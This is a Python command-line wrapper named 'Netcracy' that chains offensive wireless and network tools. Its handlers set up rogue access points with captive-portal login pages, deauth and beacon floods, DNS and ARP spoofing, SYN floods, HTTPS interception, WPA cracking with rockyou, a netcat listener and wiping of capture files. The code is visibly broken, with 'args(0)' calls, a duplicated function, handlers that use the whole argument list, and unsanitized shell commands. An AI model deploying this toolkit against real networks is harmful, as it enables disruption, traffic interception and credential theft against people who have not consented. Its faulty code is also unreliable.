#!/usr/bin/env python3
# ============================================================================
#               NETCRACY: MULTI-ENGINE SYSTEMS CONFIGURATION CORE
# ============================================================================
import sys
import os
import time
import subprocess
import tempfile
import re

def display_menu_help():
    print("====================================================")
    print("         NETCRACY: SYSTEMS MANAGEMENT INTERFACE     ")
    print("====================================================")
    print("Usage Rules:")
    print("  sudo netcracy start rogue ap <interface> [template] [ssid]")
    print("  sudo netcracy start wlan0mon <interface>")
    print("  sudo netcracy start traffic engine <interface>")
    print("  sudo netcracy start injection loop <interface> <bssid>")
    print("  sudo netcracy run network scan <target_ip/subnet>")
    print("  sudo netcracy start port listener <port>")
    print("  sudo netcracy run cpu crack <handshake.pcap>")
    print("  sudo netcracy run gpu crack <hash_file.hc22000>")
    print("  sudo netcracy run scan wireless <interface>")
    print("  sudo netcracy start spectrum monitor <interface>")
    print("  sudo netcracy start targeted scan <interface> <bssid> <channel>")
    print("  sudo netcracy run deauth <interface> <bssid> [range] [client_mac]")
    print("  sudo netcracy run pmkid capture <interface> <bssid> <channel>")
    print("  sudo netcracy run beacon flood <interface> <ssid_list_file>")
    print("  sudo netcracy run auth crash <interface> <bssid>")
    print("  sudo netcracy run packet capture <interface> <bssid> <channel> <output_prefix>")
    print("  sudo netcracy start custom rogue <interface> <ssid> <channel>")
    print("  sudo netcracy run fast scan <target_ip/subnet>")
    print("  sudo netcracy run port sweep <target_ip> <ports_list>")
    print("  sudo netcracy run script audit <target_ip/subnet>")
    print("  sudo netcracy run ping sweep <subnet>")
    print("  sudo netcracy run os detect <target_ip>")
    print("  sudo netcracy start proxy intercept <interface>")
    print("  sudo netcracy run net discovery <interface>")
    print("  sudo netcracy start syn flood <interface> <target_ip> <target_port>")
    print("  sudo netcracy start dns spoof <interface> <target_domain> <spoof_ip>")
    print("  sudo netcracy start arpspoof <interface> <target_ip> <gateway_ip>")
    print("  sudo netcracy run hc22000 convert <output.hc22000> <input.cap/.pcap>")
    print("  sudo netcracy run rule crack <hash_file.hc22000> <rule_file>")
    print("  sudo netcracy run mask crack <hash_file.hc22000> <mask>")
    print("  sudo netcracy run multi crack <hash_file.hc22000>")
    print("  sudo netcracy start wpa brute <interface> <bssid> <wordlist>")
    print("  sudo netcracy run env restore")
    print("  sudo netcracy run log clean")
    print("  sudo netcracy run mac rotate <interface>")
    print("  sudo netcracy run session backup [archive_name.tar.gz]")
    print("  sudo netcracy run service status")
    print("  sudo netcracy run interface reset <interface>")
    print("  sudo netcracy run hash verify <file_path>")
    print("  sudo netcracy run dependency check")
    print("  sudo netcracy run live connections")
    print("  sudo netcracy run config export [output_path]")
    print("====================================================")

def enforce_monitor_mode(interface):
    print(f"[*] Flipping {interface} into monitor mode configurations...")
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", interface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "iw", "dev", interface, "set", "type", "monitor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ============================================================================
#               COMMAND ENGINE EXECUTION FUNCTIONS
# ============================================================================
def get_captiveflask_templates():
    """Scans wifipumpkin3 and custom_captiveflask directories for available templates."""
    templates = set()
    search_paths = [
        os.path.expanduser("~/.config/wifipumpkin3/plugins/captiveflask"),
        "/root/.config/wifipumpkin3/plugins/captiveflask",
        "/usr/share/wifipumpkin3/plugins/captiveflask",
        "/usr/local/share/wifipumpkin3/plugins/captiveflask",
    ]
    
    for base_path in search_paths:
        if os.path.isdir(base_path):
            for item in os.listdir(base_path):
                if item.endswith(".py") and not item.startswith("__"):
                    templates.add(item[:-3])
                    
    return sorted(list(templates)) if templates else ["DarkLogin", "loginPage", "FlaskDemo"]
    
import pty

def handle_rogue_ap(args):
    target_device = args(0) if len(args) >= 1 else "wlan0"
    chosen_ssid = args(1) if len(args) >= 2 else ""
    chosen_template = args(2) if len(args) >= 3 else ""
 
    if not chosen_ssid:
        chosen_ssid = input("[?] Enter target SSID: ").strip()
        if not chosen_ssid:
            print("[-] Error: SSID parameter required for Rogue AP.")
            return

    if chosen_template:
        chosen_proxy = "captiveflask"
    else:
        proxies = ["eviltq3", "captiveflask", "pumpkinproxy"]
        print("\n[?] Select Proxy Engine:")
        for idx, p in enumerate(proxies, 1):
            print(f"    {idx}. {p}")
        p_choice = input("    Choice [1-3]: ").strip()
        chosen_proxy = proxies[int(p_choice) - 1] if p_choice in ["1", "2", "3"] else "captiveflask"

        if chosen_proxy == "captiveflask":
            templates = get_captiveflask_templates()
            print("\n[?] Select CaptiveFlask Template (misc.custom_captiveflask):")
            for idx, tmpl in enumerate(templates, 1):
                print(f"    {idx}. {tmpl}")
            t_choice = input(f"    Choice [1-{len(templates)}]: ").strip()
            if t_choice.isdigit() and 1 <= int(t_choice) <= len(templates):
                chosen_template = templates[int(t_choice) - 1]
            elif t_choice:
                chosen_template = t_choice
            else:
                chosen_template = templates

    print(f"\n[+] Netcracy -> Initializing Rogue AP on {target_device} (SSID: {chosen_ssid} | Proxy: {chosen_proxy})...")

    xpulp_cmds = [
        f"set interface {target_device}",
        f"set ssid {chosen_ssid}",
        f"set proxy {chosen_proxy}",
    ]
    if chosen_proxy == "captiveflask" and chosen_template:
        xpulp_cmds.append(f"set captiveflask.{chosen_template} true")
    xpulp_cmds.append("start")
    xpulp_str = "; ".join(xpulp_cmds)

    log_path = "/tmp/wifipumpkin_bg.log"
    if os.path.exists(log_path):
        os.remove(log_path)

    pid = os.fork()
    if pid == 0:
        os.setsid()
        master_fd, slave_fd = pty.openpty()
        proc = subprocess.Popen(
            ["wifipumpkin3", "--no-colors", "--xpulp", xpulp_str],
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            close_fds=True
        )
        os.close(slave_fd)
        with open(log_path, "w") as log_f:
            while proc.poll() is None:
                try:
                    data = os.read(master_fd, 1024)
                    if data:
                        log_f.write(data.decode("utf-8", errors="ignore"))
                        log_f.flush()
                except OSError:
                    break
        os._exit(0)

    print("[*] Waiting for AP subsystems to initialize...")
    subsystems = ("hostapd", "pydns", "pydhcp", "captiveflask", "eviltq3", "pumpkinproxy", "error")
    shown = set()
    start_time = time.time()

    while not os.path.exists(log_path) and time.time() - start_time < 3:
        time.sleep(0.1)

    if os.path.exists(log_path):
        with open(log_path, "r") as reader:
            while time.time() - start_time < 8:
                line = reader.readline()
                if not line:
                    time.sleep(0.2)
                    continue
                clean_line = line.strip()
                if clean_line and any(k in clean_line.lower() for k in subsystems):
                    if clean_line not in shown:
                        print(f"    {clean_line}")
                        shown.add(clean_line)
                if len(shown) >= 4:
                    time.sleep(0.5)
                    break

    print(f"\n[+] Netcracy -> Rogue AP active in background (Daemon PID: {pid} | Log: {log_path})")
    
def handle_wlan0mon(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    print(f"\n[+] Netcracy -> Spawning Spectrum Interceptor on {target_device}...")
    enforce_monitor_mode(target_device)
    os.system(f"sudo airodump-ng {target_device}")

def handle_traffic_engine(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    print(f"\n[+] Netcracy -> Spawning Live Traffic Dashboard on {target_device}...")
    enforce_monitor_mode(target_device)
    os.system(f"sudo bettercap -iface {target_device}")

def handle_injection_loop(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    target_bssid = args[1] if len(args) >= 2 else ""
    print(f"\n[+] Netcracy -> Initializing target authentication verification on {target_device}...")
    if target_bssid:
        enforce_monitor_mode(target_device)
        os.system(f"sudo aireplay-ng --test -a {target_bssid} {target_device}")
    else:
        print("[-] Verification Error: Target BSSID parameter required for validation checks.")

def handle_network_scan(args):
    target_ip = args[0] if len(args) >= 1 else "192.168.1.0/24"
    print(f"\n[+] Netcracy -> Initiating subnet verification map across {target_ip}...")
    os.system(f"sudo nmap -v -sV -O {target_ip}")

def handle_port_listener(args):
    target_port = args[0] if len(args) >= 1 else "4444"
    print(f"\n[+] Netcracy -> Spawning persistent socket listener on Port {target_port}...")
    os.system(f"nc -lvnp {target_port}")

def handle_cpu_crack(args):
    target_file = args[0] if len(args) >= 1 else ""
    wordlist = "/usr/share/wordlists/rockyou.txt"
    if target_file:
        print(f"\n[+] Netcracy -> Initiating CPU-accelerated validation check on {target_file}...")
        os.system(f"sudo aircrack-ng '{target_file}' -w {wordlist}")
    else:
        print("[-] Error: Absolute target path to file required.")

def handle_gpu_crack(args):
    target_file = args[0] if len(args) >= 1 else ""
    wordlist = "/usr/share/wordlists/rockyou.txt"
    if target_file:
        print(f"\n[+] Netcracy -> Spawning high-throughput processing calculation loops on {target_file}...")
        os.system(f"hashcat -m 22000 -a 0 '{target_file}' {wordlist}")
    else:
        print("[-] Error: Absolute target hash file path required.")

def handle_wireless_survey(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    print(f"\n[+] Netcracy -> Deploying interactive environment survey on {target_device}...")
    enforce_monitor_mode(target_device)
    os.system(f"sudo wifite --kill -i {target_device}")

def handle_spectrum_monitor(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    print(f"\n[+] Netcracy -> Launching continuous targeted spectrum sweep on {target_device}...")
    enforce_monitor_mode(target_device)
    os.system(f"sudo airodump-ng {target_device}")

def handle_targeted_scan(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    target_bssid = args[1] if len(args) >= 2 else ""
    target_channel = args[2] if len(args) >= 3 else ""
    
    print(f"\n[+] Netcracy -> Deploying Optimized Spectrum Interceptor on {target_device}...")
    enforce_monitor_mode(target_device)
    
    if target_bssid and target_channel:
        print(f"[*] Locking frequency capture onto BSSID [{target_bssid}] on Channel [{target_channel}]")
        os.system(f"sudo airodump-ng --bssid {target_bssid} --channel {target_channel} {target_device}")
    elif target_channel:
        print(f"[*] Locking frequency capture onto Channel [{target_channel}]")
        os.system(f"sudo airodump-ng --channel {target_channel} {target_device}")
    else:
        os.system(f"sudo airodump-ng {target_device}")

def handle_deauth(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    target_bssid  = args[1] if len(args) >= 2 else ""
    deauth_range  = args[2] if len(args) >= 3 else "0"  # 0 fires a continuous loop
    client_mac    = args[3] if len(args) >= 4 else ""

    print(f"\n[+] Netcracy -> Launching Deauth Framework...")
    
    if target_bssid:
        enforce_monitor_mode(target_device)
        print(f"[*] Target Access Point BSSID: {target_bssid}")
        print(f"[*] Burst Range Counter      : {deauth_range}")
        
        cmd = f"sudo aireplay-ng --deauth {deauth_range} -a {target_bssid}"
        if client_mac:
            print(f"[*] Isolating Target Client   : {client_mac}")
            cmd += f" -c {client_mac}"
            
        cmd += f" {target_device}"
        os.system(cmd)
    else:
        print("[-] Target Error: Access Point BSSID parameter required for deauth operations.")

# ============================================================================
#               COMMAND ENGINES (20 MODULE EXTENSIONS)
# ============================================================================

def handle_pmkid_capture(args):
    target_device = args[0] if len(args) >= 1 else "wlan0"
    target_bssid  = args[1] if len(args) >= 2 else ""
    target_channel = args[2] if len(args) >= 3 else ""

# ============================================================================
#               COMMAND ENGINES (20 MODULE EXTENSIONS)
# ============================================================================

def handle_pmkid_capture(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_bssid  = args if len(args) >= 2 else ""
    target_channel = args if len(args) >= 3 else ""
    if target_bssid and target_channel:
        enforce_monitor_mode(target_device)
        os.system(f"sudo iw dev {target_device} set channel {target_channel}")
        os.system(f"sudo hcxdumptool -i {target_device} --bssidfilter={target_bssid} -o capture.pcapng --enable_status=1")

def handle_beacon_flood(args):
    target_device = args if len(args) >= 1 else "wlan0"
    ssid_file     = args if len(args) >= 2 else ""
    if ssid_file:
        enforce_monitor_mode(target_device)
        os.system(f"sudo mdk4 {target_device} b -f {ssid_file}")

def handle_auth_crash(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_bssid  = args if len(args) >= 2 else ""
    if target_bssid:
        enforce_monitor_mode(target_device)
        os.system(f"sudo mdk4 {target_device} a -a {target_bssid}")

def handle_packet_capture(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_bssid  = args if len(args) >= 2 else ""
    target_channel = args if len(args) >= 3 else ""
    output_prefix = args if len(args) >= 4 else "raw_dump"
    if target_bssid and target_channel:
        enforce_monitor_mode(target_device)
        os.system(f"sudo airodump-ng --bssid {target_bssid} --channel {target_channel} -w {output_prefix} {target_device}")

def handle_custom_rogue(args):
    target_device = args if len(args) >= 1 else "wlan0"
    custom_ssid   = args if len(args) >= 2 else "Free_HighSpeed_WiFi"
    channel       = args if len(args) >= 3 else "6"
    os.system(f"sudo wifipumpkin3 -i {target_device} --set wireless.ssid {custom_ssid} --set wireless.channel {channel}")

def handle_fast_scan(args):
    target_ip = args if len(args) >= 1 else "192.168.1.1"
    os.system(f"sudo nmap -F -T4 -Pn {target_ip}")

def handle_port_sweep(args):
    target_ip  = args if len(args) >= 1 else "192.168.1.1"
    ports_list = args if len(args) >= 2 else "21,22,23,25,80,443,445,3389,8080"
    os.system(f"sudo nmap -p {ports_list} -sS -Pn {target_ip}")

def handle_script_audit(args):
    target_ip = args if len(args) >= 1 else "192.168.1.1"
    os.system(f"sudo nmap -sV --script=vuln -Pn {target_ip}")

def handle_ping_sweep(args):
    subnet = args if len(args) >= 1 else "192.168.1.0/24"
    os.system(f"sudo nmap -sn -PE {subnet}")

def handle_os_detect(args):
    target_ip = args if len(args) >= 1 else "192.168.1.1"
    os.system(f"sudo nmap -O --osscan-guess -Pn {target_ip}")

def handle_proxy_intercept(args):
    target_device = args if len(args) >= 1 else "wlan0"
    os.system(f"sudo bettercap -iface {target_device} -eval 'any.proxy on; http.proxy on; https.proxy on'")

def handle_net_discovery(args):
    target_device = args if len(args) >= 1 else "wlan0"
    os.system(f"sudo bettercap -iface {target_device} -eval 'net.probe on; net.show'")

def handle_syn_flood(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_ip     = args if len(args) >= 2 else ""
    target_port   = args if len(args) >= 3 else "80"
    if target_ip:
        os.system(f"sudo bettercap -iface {target_device} -eval 'syn.flood.target {target_ip}; syn.flood.port {target_port}; syn.flood on'")

def handle_dns_spoof(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_domain = args if len(args) >= 2 else "google.com"
    spoof_ip      = args if len(args) >= 3 else "192.168.1.1"
    os.system(f"sudo bettercap -iface {target_device} -eval 'set dns.spoof.domains {target_domain}; set dns.spoof.address {spoof_ip}; dns.spoof on'")

def handle_arpspoof(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_ip     = args if len(args) >= 2 else ""
    gateway_ip    = args if len(args) >= 3 else ""
    if target_ip and gateway_ip:
        os.system(f"sudo bettercap -iface {target_device} -eval 'set arp.spoof.targets {target_ip}; set arp.spoof.internal true; arp.spoof on; net.sniff on'")

def handle_hc22000_convert(args):
    output_file = args if len(args) >= 1 else "capture.hc22000"
    input_cap   = args if len(args) >= 2 else "raw_dump-01.cap"
    os.system(f"hcxpcapngtool -o {output_file} {input_cap}")

def handle_rule_crack(args):
    target_file = args if len(args) >= 1 else ""
    rule_file   = args if len(args) >= 2 else "/usr/share/hashcat/rules/best64.rule"
    wordlist    = "/usr/share/wordlists/rockyou.txt"
    if target_file:
        os.system(f"hashcat -m 22000 -a 0 '{target_file}' -r {rule_file} {wordlist}")

def handle_mask_crack(args):
    target_file = args if len(args) >= 1 else ""
    mask_string = args if len(args) >= 2 else "?d?d?d?d?d?d?d?d"
    if target_file:
        os.system(f"hashcat -m 22000 -a 3 '{target_file}' '{mask_string}'")

def handle_multi_crack(args):
    target_file = args if len(args) >= 1 else ""
    wordlist    = "/usr/share/wordlists/rockyou.txt"
    if target_file:
        os.system(f"hashcat -m 22000 -a 0 --force --workload-profile=3 '{target_file}' {wordlist}")

def handle_wpa_brute(args):
    target_device = args if len(args) >= 1 else "wlan0"
    target_bssid  = args if len(args) >= 2 else ""
    wordlist      = args if len(args) >= 3 else "/usr/share/wordlists/rockyou.txt"
    if target_bssid:
        os.system(f"sudo aircrack-ng -b {target_bssid} -w {wordlist} *.cap")

# ============================================================================
#               UTILITY & DATA MANAGEMENT FUNCTIONS (10 EXTENSIONS)
# ============================================================================

def handle_env_restore(args):
    print("\n[+] Netcracy -> Restoring standard operational network infrastructure...")
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def handle_log_clean(args):
    print("\n[+] Netcracy -> Sanitizing workspace directory dumps...")
    os.system("rm -f *.cap *.pcap *.pcapng *.csv *.kismet *.netxml raw_dump*")

def handle_mac_rotate(args):
    target_device = args if len(args) >= 1 else "wlan0"
    os.system(f"sudo ip link set {target_device} down")
    os.system(f"sudo macchanger -r {target_device}")
    os.system(f"sudo ip link set {target_device} up")

def handle_session_backup(args):
    archive_name = args if len(args) >= 1 else f"session_backup_{int(time.time())}.tar.gz"
    os.system(f"tar -czf {archive_name} *.cap *.hc22000 2>/dev/null || echo '[-] No matching logs found.'")

def handle_service_status(args):
    for service in ["NetworkManager", "docker"]:
        res = subprocess.run(["systemctl", "is-active", service], capture_output=True, text=True)
        print(f"[*] Core Daemon Engine [{service}]: {res.stdout.strip()}")

def handle_interface_reset(args):
    target_device = args if len(args) >= 1 else "wlan0"
    os.system(f"sudo ip link set {target_device} down")
    time.sleep(1)
    os.system(f"sudo iw dev {target_device} set type managed")
    os.system(f"sudo ip link set {target_device} up")

def handle_hash_verify(args):
    target_file = args if len(args) >= 1 else ""
    if target_file and os.path.exists(target_file):
        os.system(f"sha256sum '{target_file}'")

def handle_dependency_check(args):
    dependencies = ["aircrack-ng", "bettercap", "wifipumpkin3", "hashcat", "nmap"]
    for binary in dependencies:
        path_check = subprocess.run(["which", binary], capture_output=True)
        status = "ACTIVE" if path_check.returncode == 0 else "NOT FOUND"
        print(f"  --> {binary.ljust(15)} : {status}")

def handle_live_connections(args):
    os.system("ss -tunapl")

def handle_config_export(args):
    output_path = args if len(args) >= 1 else "netcracy_profile.cfg"
    with open(output_path, "w") as cfg:
        cfg.write(f"# Netcracy Framework Workspace Profile Configuration\n")
        cfg.write(f"EXPORT_TIME={time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        cfg.write(f"SYSTEM_USER={os.getlogin() if os.isatty(0) else 'root'}\n")

# ============================================================================
#               THE CENTRAL DISPATCH DICTIONARY
# ============================================================================

COMMAND_MAP = {
    ("start", "rogue", "ap"): handle_rogue_ap,
    ("start", "wlan0mon", ""): handle_wlan0mon,  
    ("start", "wlan0mon"): handle_wlan0mon,
    ("start", "traffic", "engine"): handle_traffic_engine,
    ("start", "injection", "loop"): handle_injection_loop,
    ("run", "network", "scan"): handle_network_scan,
    ("start", "port", "listener"): handle_port_listener,
    ("run", "cpu", "crack"): handle_cpu_crack,
    ("run", "gpu", "crack"): handle_gpu_crack,
    ("run", "scan", "wireless"): handle_wireless_survey,
    ("start", "spectrum", "monitor"): handle_spectrum_monitor,
    ("start", "targeted", "scan"): handle_targeted_scan,
    ("run", "deauth"): handle_deauth,
    ("run", "pmkid", "capture"): handle_pmkid_capture,
    ("run", "beacon", "flood"): handle_beacon_flood,
    ("run", "auth", "crash"): handle_auth_crash,
    ("run", "packet", "capture"): handle_packet_capture,
    ("start", "custom", "rogue"): handle_custom_rogue,
    ("run", "fast", "scan"): handle_fast_scan,
    ("run", "port", "sweep"): handle_port_sweep,
    ("run", "script", "audit"): handle_script_audit,
    ("run", "ping", "sweep"): handle_ping_sweep,
    ("run", "os", "detect"): handle_os_detect,
    ("start", "proxy", "intercept"): handle_proxy_intercept,
    ("run", "net", "discovery"): handle_net_discovery,
    ("start", "syn", "flood"): handle_syn_flood,
    ("start", "dns", "spoof"): handle_dns_spoof,
    ("start", "arpspoof"): handle_arpspoof,
    ("run", "hc22000", "convert"): handle_hc22000_convert,
("run", "rule", "crack"): handle_rule_crack,
("run", "mask", "crack"): handle_mask_crack,
("run", "multi", "crack"): handle_multi_crack,
("start", "wpa", "brute"): handle_wpa_brute,
("run", "env", "restore"): handle_env_restore,
("run", "log", "clean"): handle_log_clean,
("run", "mac", "rotate"): handle_mac_rotate,
("run", "session", "backup"): handle_session_backup,
("run", "service", "status"): handle_service_status,
("run", "interface", "reset"): handle_interface_reset,
("run", "hash", "verify"): handle_hash_verify,
("run", "dependency", "check"): handle_dependency_check,
("run", "live", "connections"): handle_live_connections,
("run", "config", "export"): handle_config_export,
}
def main():
    if len(sys.argv) < 2:
        display_menu_help()
        sys.exit(1)

    # Sanitize command arguments into a consistent lowercase list
    tokens = [str(arg).lower() for arg in sys.argv[1:]]

    # Dynamically match token chains against our structural lookup dictionary keys
    matched = False
    for command_tuple, function_handler in COMMAND_MAP.items():
        cmd_len = len(command_tuple)
        if len(tokens) >= cmd_len and tuple(tokens[:cmd_len]) == command_tuple:
            # Isolate the remaining arguments to pass directly to the target utility
            remaining_args = tokens[cmd_len:]
            try:
                function_handler(remaining_args)
            except KeyboardInterrupt:
                print("\n\n[*] Intercepted break code execution. Restoring network environment daemons...")
                subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            matched = True
            break

    if not matched:
        print("[-] Error: Unrecognized string parameter sequence combination.")
        display_menu_help()

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[-] Critical Privilege Error: This interface wrapper requires administrative privileges (sudo).")
        sys.exit(1)
    main()
    
